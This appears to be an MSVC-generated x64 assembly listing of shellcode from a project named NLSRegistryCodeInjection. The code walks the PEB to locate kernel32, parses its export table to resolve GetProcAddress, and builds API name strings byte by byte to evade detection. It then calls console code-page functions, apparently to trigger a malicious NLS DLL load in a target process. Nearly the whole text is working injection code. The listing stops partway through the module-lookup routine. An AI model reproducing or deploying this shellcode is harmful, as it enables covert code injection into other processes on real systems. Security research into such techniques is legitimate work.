; Listing generated by Microsoft (R) Optimizing Compiler Version 19.30.30706.0 

include listing.inc

;INCLUDELIB LIBCMT
;INCLUDELIB OLDNAMES

PUBLIC	?iat_kernel32@@3Ukernel32Iat@@A			; iat_kernel32
PUBLIC	?piat_struct32@@3PEAUkernel32Iat@@EA		; piat_struct32
_BSS	SEGMENT
?iat_kernel32@@3Ukernel32Iat@@A DB 030H DUP (?)		; iat_kernel32
?piat_struct32@@3PEAUkernel32Iat@@EA DQ 01H DUP (?)	; piat_struct32
_BSS	ENDS
PUBLIC	?GetModuleByName@@YAPEAXPEA_W@Z			; GetModuleByName
PUBLIC	?GetFunctionByName@@YAPEAXPEAXPEAD@Z		; GetFunctionByName
PUBLIC	?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z	; initializeIatShellcode
PUBLIC	?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z	; SpawnPayload
PUBLIC	main
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
; Function compile flags: /Odtp
_TEXT SEGMENT
AlignRSP PROC
	push rsi ; Preserve RSI since we're stomping on it
	mov rsi, rsp ; Save the value of RSP so it can be restored
	and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
	sub rsp, 020h ; Allocate homing space for ExecutePayload
	call main ; Call the entry point of the payload
	mov rsp, rsi ; Restore the original value of RSP
	pop rsi ; Restore RSI
	ret ; Return to caller
AlignRSP ENDP
_TEXT ENDS

_TEXT	SEGMENT
iat$ = 32
dwCodeID$ = 96
main	PROC
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\ShellcodeInjection.cpp
; Line 69
$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H
; Line 71
	lea	rcx, QWORD PTR iat$[rsp]
	call	?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z ; initializeIatShellcode
	test	eax, eax
	je	SHORT $LN2@main
; Line 72
	mov	eax, 1
	jmp	SHORT $LN1@main
$LN2@main:
; Line 74
	lea	rdx, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR dwCodeID$[rsp]
	call	?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z ; SpawnPayload
; Line 76
	xor	eax, eax
$LN1@main:
; Line 77
	add	rsp, 88					; 00000058H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
dwCodePageID$ = 32
dwCodePageId$ = 64
iat$ = 72
?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z PROC		; SpawnPayload
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\ShellcodeInjection.cpp
; Line 51
$LN7:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 52
	mov	rax, QWORD PTR dwCodePageId$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR dwCodePageID$[rsp], eax
; Line 53
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+8]
	test	rax, rax
	jne	SHORT $LN2@SpawnPaylo
; Line 55
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+24]
	test	eax, eax
	jne	SHORT $LN3@SpawnPaylo
; Line 56
	jmp	SHORT $LN1@SpawnPaylo
$LN3@SpawnPaylo:
$LN2@SpawnPaylo:
; Line 59
	mov	ecx, DWORD PTR dwCodePageID$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax]
	test	eax, eax
	jne	SHORT $LN4@SpawnPaylo
; Line 60
	jmp	SHORT $LN1@SpawnPaylo
$LN4@SpawnPaylo:
; Line 62
	mov	ecx, DWORD PTR dwCodePageID$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+16]
	test	eax, eax
	jne	SHORT $LN5@SpawnPaylo
; Line 63
	jmp	SHORT $LN1@SpawnPaylo
$LN5@SpawnPaylo:
; Line 65
	xor	ecx, ecx
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+32]
$LN1@SpawnPaylo:
; Line 66
	add	rsp, 56					; 00000038H
	ret	0
?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z ENDP		; SpawnPayload
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
set_console_cp_name$ = 32
alloc_console_name$ = 48
get_proc_name$ = 64
get_console_window_name$ = 80
set_console_output_cp_name$ = 104
set_Thread_UI_language_Name$ = 128
baseAddrKernel32$ = 152
kernel32_dll_name$ = 160
get_proc$ = 192
iat$ = 224
?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z PROC	; initializeIatShellcode
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\ShellcodeInjection.cpp
; Line 7
$LN10:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 216				; 000000d8H
; Line 8
	mov	eax, 107				; 0000006bH
	mov	WORD PTR kernel32_dll_name$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+2], ax
	mov	eax, 114				; 00000072H
	mov	WORD PTR kernel32_dll_name$[rsp+4], ax
	mov	eax, 110				; 0000006eH
	mov	WORD PTR kernel32_dll_name$[rsp+6], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+8], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+10], ax
	mov	eax, 51					; 00000033H
	mov	WORD PTR kernel32_dll_name$[rsp+12], ax
	mov	eax, 50					; 00000032H
	mov	WORD PTR kernel32_dll_name$[rsp+14], ax
	mov	eax, 46					; 0000002eH
	mov	WORD PTR kernel32_dll_name$[rsp+16], ax
	mov	eax, 100				; 00000064H
	mov	WORD PTR kernel32_dll_name$[rsp+18], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+20], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
	xor	eax, eax
	mov	WORD PTR kernel32_dll_name$[rsp+24], ax
; Line 9
	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
	call	?GetModuleByName@@YAPEAXPEA_W@Z		; GetModuleByName
	mov	QWORD PTR baseAddrKernel32$[rsp], rax
; Line 10
	cmp	QWORD PTR baseAddrKernel32$[rsp], 0
	jne	SHORT $LN2@initialize
; Line 11
	mov	eax, 1
	jmp	$LN1@initialize
$LN2@initialize:
; Line 13
	mov	BYTE PTR get_proc_name$[rsp], 71	; 00000047H
	mov	BYTE PTR get_proc_name$[rsp+1], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+2], 116	; 00000074H
	mov	BYTE PTR get_proc_name$[rsp+3], 80	; 00000050H
	mov	BYTE PTR get_proc_name$[rsp+4], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+5], 111	; 0000006fH
	mov	BYTE PTR get_proc_name$[rsp+6], 99	; 00000063H
	mov	BYTE PTR get_proc_name$[rsp+7], 65	; 00000041H
	mov	BYTE PTR get_proc_name$[rsp+8], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+9], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+10], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+11], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+12], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+13], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+14], 0
; Line 14
	lea	rdx, QWORD PTR get_proc_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	call	?GetFunctionByName@@YAPEAXPEAXPEAD@Z	; GetFunctionByName
	mov	QWORD PTR get_proc$[rsp], rax
; Line 15
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN3@initialize
; Line 16
	mov	eax, 3
	jmp	$LN1@initialize
$LN3@initialize:
; Line 18
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR [rax+40], rcx
; Line 20
	mov	BYTE PTR get_console_window_name$[rsp], 71 ; 00000047H
	mov	BYTE PTR get_console_window_name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR get_console_window_name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR get_console_window_name$[rsp+3], 67 ; 00000043H
	mov	BYTE PTR get_console_window_name$[rsp+4], 111 ; 0000006fH
	mov	BYTE PTR get_console_window_name$[rsp+5], 110 ; 0000006eH
	mov	BYTE PTR get_console_window_name$[rsp+6], 115 ; 00000073H
	mov	BYTE PTR get_console_window_name$[rsp+7], 111 ; 0000006fH
	mov	BYTE PTR get_console_window_name$[rsp+8], 108 ; 0000006cH
	mov	BYTE PTR get_console_window_name$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR get_console_window_name$[rsp+10], 87 ; 00000057H
	mov	BYTE PTR get_console_window_name$[rsp+11], 105 ; 00000069H
	mov	BYTE PTR get_console_window_name$[rsp+12], 110 ; 0000006eH
	mov	BYTE PTR get_console_window_name$[rsp+13], 100 ; 00000064H
	mov	BYTE PTR get_console_window_name$[rsp+14], 111 ; 0000006fH
	mov	BYTE PTR get_console_window_name$[rsp+15], 119 ; 00000077H
	mov	BYTE PTR get_console_window_name$[rsp+16], 0
; Line 21
	mov	BYTE PTR alloc_console_name$[rsp], 65	; 00000041H
	mov	BYTE PTR alloc_console_name$[rsp+1], 108 ; 0000006cH
	mov	BYTE PTR alloc_console_name$[rsp+2], 108 ; 0000006cH
	mov	BYTE PTR alloc_console_name$[rsp+3], 111 ; 0000006fH
	mov	BYTE PTR alloc_console_name$[rsp+4], 99	; 00000063H
	mov	BYTE PTR alloc_console_name$[rsp+5], 67	; 00000043H
	mov	BYTE PTR alloc_console_name$[rsp+6], 111 ; 0000006fH
	mov	BYTE PTR alloc_console_name$[rsp+7], 110 ; 0000006eH
	mov	BYTE PTR alloc_console_name$[rsp+8], 115 ; 00000073H
	mov	BYTE PTR alloc_console_name$[rsp+9], 111 ; 0000006fH
	mov	BYTE PTR alloc_console_name$[rsp+10], 108 ; 0000006cH
	mov	BYTE PTR alloc_console_name$[rsp+11], 101 ; 00000065H
	mov	BYTE PTR alloc_console_name$[rsp+12], 0
; Line 22
	mov	BYTE PTR set_console_cp_name$[rsp], 83	; 00000053H
	mov	BYTE PTR set_console_cp_name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR set_console_cp_name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR set_console_cp_name$[rsp+3], 67 ; 00000043H
	mov	BYTE PTR set_console_cp_name$[rsp+4], 111 ; 0000006fH
	mov	BYTE PTR set_console_cp_name$[rsp+5], 110 ; 0000006eH
	mov	BYTE PTR set_console_cp_name$[rsp+6], 115 ; 00000073H
	mov	BYTE PTR set_console_cp_name$[rsp+7], 111 ; 0000006fH
	mov	BYTE PTR set_console_cp_name$[rsp+8], 108 ; 0000006cH
	mov	BYTE PTR set_console_cp_name$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR set_console_cp_name$[rsp+10], 67 ; 00000043H
	mov	BYTE PTR set_console_cp_name$[rsp+11], 80 ; 00000050H
	mov	BYTE PTR set_console_cp_name$[rsp+12], 0
; Line 23
	mov	BYTE PTR set_console_output_cp_name$[rsp], 83 ; 00000053H
	mov	BYTE PTR set_console_output_cp_name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR set_console_output_cp_name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR set_console_output_cp_name$[rsp+3], 67 ; 00000043H
	mov	BYTE PTR set_console_output_cp_name$[rsp+4], 111 ; 0000006fH
	mov	BYTE PTR set_console_output_cp_name$[rsp+5], 110 ; 0000006eH
	mov	BYTE PTR set_console_output_cp_name$[rsp+6], 115 ; 00000073H
	mov	BYTE PTR set_console_output_cp_name$[rsp+7], 111 ; 0000006fH
	mov	BYTE PTR set_console_output_cp_name$[rsp+8], 108 ; 0000006cH
	mov	BYTE PTR set_console_output_cp_name$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR set_console_output_cp_name$[rsp+10], 79 ; 0000004fH
	mov	BYTE PTR set_console_output_cp_name$[rsp+11], 117 ; 00000075H
	mov	BYTE PTR set_console_output_cp_name$[rsp+12], 116 ; 00000074H
	mov	BYTE PTR set_console_output_cp_name$[rsp+13], 112 ; 00000070H
	mov	BYTE PTR set_console_output_cp_name$[rsp+14], 117 ; 00000075H
	mov	BYTE PTR set_console_output_cp_name$[rsp+15], 116 ; 00000074H
	mov	BYTE PTR set_console_output_cp_name$[rsp+16], 67 ; 00000043H
	mov	BYTE PTR set_console_output_cp_name$[rsp+17], 80 ; 00000050H
	mov	BYTE PTR set_console_output_cp_name$[rsp+18], 0
; Line 24
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp], 83 ; 00000053H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+3], 84 ; 00000054H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+4], 104 ; 00000068H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+5], 114 ; 00000072H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+6], 101 ; 00000065H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+7], 97 ; 00000061H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+8], 100 ; 00000064H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+9], 85 ; 00000055H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+10], 73 ; 00000049H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+11], 76 ; 0000004cH
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+12], 97 ; 00000061H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+13], 110 ; 0000006eH
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+14], 103 ; 00000067H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+15], 117 ; 00000075H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+16], 97 ; 00000061H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+17], 103 ; 00000067H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+18], 101 ; 00000065H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+19], 0
; Line 26
	lea	rdx, QWORD PTR set_console_output_cp_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx], rax
; Line 27
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	SHORT $LN4@initialize
; Line 28
	mov	eax, 4
	jmp	$LN1@initialize
$LN4@initialize:
; Line 30
	lea	rdx, QWORD PTR get_console_window_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+8], rax
; Line 31
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+8], 0
	jne	SHORT $LN5@initialize
; Line 32
	mov	eax, 5
	jmp	$LN1@initialize
$LN5@initialize:
; Line 34
	lea	rdx, QWORD PTR set_console_cp_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+16], rax
; Line 35
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+16], 0
	jne	SHORT $LN6@initialize
; Line 36
	mov	eax, 6
	jmp	SHORT $LN1@initialize
$LN6@initialize:
; Line 38
	lea	rdx, QWORD PTR alloc_console_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+24], rax
; Line 39
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+24], 0
	jne	SHORT $LN7@initialize
; Line 40
	mov	eax, 7
	jmp	SHORT $LN1@initialize
$LN7@initialize:
; Line 42
	lea	rdx, QWORD PTR set_Thread_UI_language_Name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+32], rax
; Line 43
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+32], 0
	jne	SHORT $LN8@initialize
; Line 44
	mov	eax, 8
	jmp	SHORT $LN1@initialize
$LN8@initialize:
; Line 46
	xor	eax, eax
$LN1@initialize:
; Line 47
	add	rsp, 216				; 000000d8H
	ret	0
?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z ENDP	; initializeIatShellcode
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?GetFunctionByName@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?GetFunctionByName@@YAPEAXPEAXPEAD@Z PROC		; GetFunctionByName, COMDAT
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\defs.h
; Line 68
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 69
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 70
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@GetFunctio
; Line 71
	xor	eax, eax
	jmp	$LN1@GetFunctio
$LN8@GetFunctio:
; Line 73
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 74
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 75
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@GetFunctio
; Line 76
	xor	eax, eax
	jmp	$LN1@GetFunctio
$LN9@GetFunctio:
; Line 79
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 80
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 81
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 83
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 84
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 85
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 88
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@GetFunctio
$LN2@GetFunctio:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@GetFunctio:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@GetFunctio
; Line 89
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 90
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 91
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 93
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 95
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@GetFunctio
$LN5@GetFunctio:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@GetFunctio:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@GetFunctio
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@GetFunctio
; Line 96
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@GetFunctio
	jmp	SHORT $LN6@GetFunctio
$LN10@GetFunctio:
; Line 97
	jmp	SHORT $LN5@GetFunctio
$LN6@GetFunctio:
; Line 98
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@GetFunctio
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@GetFunctio
; Line 100
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@GetFunctio
$LN11@GetFunctio:
; Line 102
	jmp	$LN2@GetFunctio
$LN3@GetFunctio:
; Line 103
	xor	eax, eax
$LN1@GetFunctio:
; Line 104
	add	rsp, 120				; 00000078H
	ret	0
?GetFunctionByName@@YAPEAXPEAXPEAD@Z ENDP		; GetFunctionByName
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?GetModuleByName@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv141 = 8
tv160 = 10
curr_name$2 = 16
c1$3 = 24
c2$4 = 28
tv137 = 32
tv156 = 36
entry$5 = 40
current$6 = 48
head$ = 56
peb$ = 64
ldr$ = 72
module_name$ = 96
?GetModuleByName@@YAPEAXPEA_W@Z PROC			; GetModuleByName, COMDAT
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\defs.h
; Line 30
$LN20:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H
; Line 33
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 37
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 39
	mov	rax, QWORD PTR ldr$[rsp]
	add	rax, 32					; 00000020H
	mov	QWORD PTR head$[rsp], rax
; Line 40
	mov	rax, QWORD PTR head$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR current$6[rsp], rax
	jmp	SHORT $LN4@GetModuleB
$LN2@GetModuleB:
	mov	rax, QWORD PTR current$6[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR current$6[rsp], rax
$LN4@GetModuleB:
	mov	rax, QWORD PTR head$[rsp]
	cmp	QWORD PTR current$6[rsp], rax
	je	$LN3@GetModuleB
; Line 41
	mov	rax, QWORD PTR current$6[rsp]
	sub	rax, 16
	mov	QWORD PTR entry$5[rsp], rax
; Line 42
	cmp	QWORD PTR entry$5[rsp], 0
	je	SHORT $LN9@GetModuleB
	mov	rax, QWORD PTR entry$5[rsp]
	cmp	QWORD PTR [rax+48], 0
	jne	SHORT $LN8@GetModuleB
$LN9@GetModuleB:
	jmp	$LN3@GetModuleB
$LN8@GetModuleB:
; Line 44
	mov	rax, QWORD PTR entry$5[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$2[rsp], rax
; Line 45
	cmp	QWORD PTR curr_name$2[rsp], 0
	jne	SHORT $LN10@GetModuleB
	jmp	SHORT $LN2@GetModuleB
$LN10@GetModuleB:
; Line 48
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN7@GetModuleB
$LN5@GetModuleB:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN7@GetModuleB:
	mov	rax, QWORD PTR entry$5[rsp]
	movzx	eax, WORD PTR [rax+88]
	cmp	QWORD PTR i$1[rsp], rax
	jae	$LN6@GetModuleB
; Line 50
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	SHORT $LN12@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN11@GetModuleB
$LN12@GetModuleB:
; Line 51
	jmp	$LN6@GetModuleB
$LN11@GetModuleB:
; Line 54
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN16@GetModuleB
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN16@GetModuleB
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv137[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv137[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv137[rsp]
	mov	WORD PTR tv141[rsp], ax
	jmp	SHORT $LN17@GetModuleB
$LN16@GetModuleB:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv141[rsp], ax
$LN17@GetModuleB:
	movzx	eax, WORD PTR tv141[rsp]
	mov	WORD PTR c1$3[rsp], ax
; Line 55
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN18@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN18@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv156[rsp], eax
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv156[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv156[rsp]
	mov	WORD PTR tv160[rsp], ax
	jmp	SHORT $LN19@GetModuleB
$LN18@GetModuleB:
